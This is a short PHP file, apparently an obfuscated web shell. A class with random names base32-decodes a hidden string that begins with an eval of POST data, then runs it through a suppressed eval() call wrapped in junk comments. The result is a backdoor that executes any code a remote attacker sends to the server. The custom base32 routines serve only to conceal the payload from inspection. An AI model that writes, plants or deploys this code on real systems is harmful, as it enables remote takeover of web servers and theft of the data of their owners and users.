<?php
class ZFMT{
        public $UQIH = null;
        public $BZGA = null;
        function __construct(){
        $this->UQIH = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->BZGA = @QMRC($this->UQIH);
        @eval("/*quMa!<m*/".$this->BZGA."/*quMa!<m*/");
        }}
new ZFMT();
function VKLC($CTRK){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $CHIZ = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($CTRK); $i < $j; $i++){
    $v <<= 8;
        $v += ord($CTRK[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $CHIZ .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $CHIZ .= $BASE32_ALPHABET[$v];}
    return $CHIZ;}
function QMRC($CTRK){
    $CHIZ = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($CTRK); $i < $j; $i++){
        $v <<= 5;
        if ($CTRK[$i] >= 'a' && $CTRK[$i] <= 'z'){
            $v += (ord($CTRK[$i]) - 97);
        } elseif ($CTRK[$i] >= '2' && $CTRK[$i] <= '7') {
            $v += (24 + $CTRK[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $CHIZ .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $CHIZ;}
?>
